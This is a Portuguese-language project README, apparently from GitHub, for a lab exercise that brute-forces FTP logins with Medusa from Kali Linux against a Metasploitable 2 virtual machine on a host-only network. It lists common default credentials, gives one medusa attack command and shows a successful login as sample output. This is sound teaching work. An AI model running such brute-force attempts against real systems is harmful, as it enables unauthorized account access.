# medusa-bruteforce-attacks
Projeto prático de cibersegurança simulando ataques de força bruta e técnicas de autenticação em ambientes controlados.

# 🔐 Projeto Pentest Básico com Kali Linux + Medusa

## ⚠️ Aviso

Este projeto é apenas para fins educacionais.

Não utilize essas técnicas sem autorização.

## 📌 Descrição

Este projeto mostra, de forma simples, como realizar testes de **força bruta** usando o Kali Linux e a ferramenta Medusa.

O objetivo é aprender na prática como ataques funcionam e como se proteger.

---

## 🖥️ Ambiente

Foram usadas duas máquinas virtuais:

- Kali Linux (atacante)
- Metasploitable 2 (alvo)

### 🌐 Rede

- Tipo: Host-Only
- IP exemplo:
  - Kali: 192.168.56.10
  - Alvo: 192.168.56.20

---

## 🔑 Wordlists

## 📁 combo.txt (usuário:senha juntos — opcional)

admin:admin
admin:123456
root:toor
user:password
msfadmin:msfadmin
guest:guest
test:test

## 🚀 Exemplo de Ataque

```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ftp

## 📊 Resultado

Exemplo de saída:

LOGIN SUCCESS: msfadmin / msfadmin

Isso mostra que senhas fracas podem ser descobertas facilmente.
